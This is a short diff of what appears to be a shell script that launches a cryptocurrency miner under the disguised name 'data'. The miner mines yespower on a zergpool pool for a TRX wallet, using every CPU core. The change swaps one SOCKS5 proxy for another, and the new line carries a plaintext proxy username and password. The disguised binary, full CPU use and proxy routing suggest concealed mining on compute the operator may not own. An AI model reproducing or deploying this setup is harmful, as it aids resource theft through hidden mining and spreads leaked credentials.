@@ -10,4 +10,4 @@ chmod +x data
 ph add data
 
 
-./data -a yespower -o stratum+tcp://yespower.asia.mine.zergpool.com:6533 -u TJXKzk3ZhPZn5P51RTkWP78SUdqXGPc4rX -p  c=TRX -t $(nproc) -x socks5://192.252.220.92:17328
+./data -a yespower -o stratum+tcp://yespower.asia.mine.zergpool.com:6533 -u TJXKzk3ZhPZn5P51RTkWP78SUdqXGPc4rX -p  c=TRX -t $(nproc) -x socks5://ubuntu2004:LijayaAnli1188@209.127.96.240:7835
